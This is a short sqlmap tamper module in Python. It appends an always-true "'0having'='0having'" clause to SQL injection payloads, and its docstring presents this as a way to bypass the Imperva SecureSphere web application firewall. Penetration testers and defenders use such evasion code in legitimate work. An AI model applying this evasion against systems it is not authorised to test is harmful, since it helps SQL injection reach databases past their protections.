#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2011 sqlmap developers (http://www.sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import re

from lib.core.common import randomRange
from lib.core.data import kb
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload):
    """
    Appends special crafted string

    Example:
        * Input: AND 1=1
        * Output: AND 1=1 and '0having'='0having'

    Notes:
        * Useful for bypassing Imperva SecureSphere WAF
        * Reference: http://seclists.org/fulldisclosure/2011/May/163
    """

    retVal = payload

    if payload:
        retVal += " and '0having'='0having'"

    return retVal
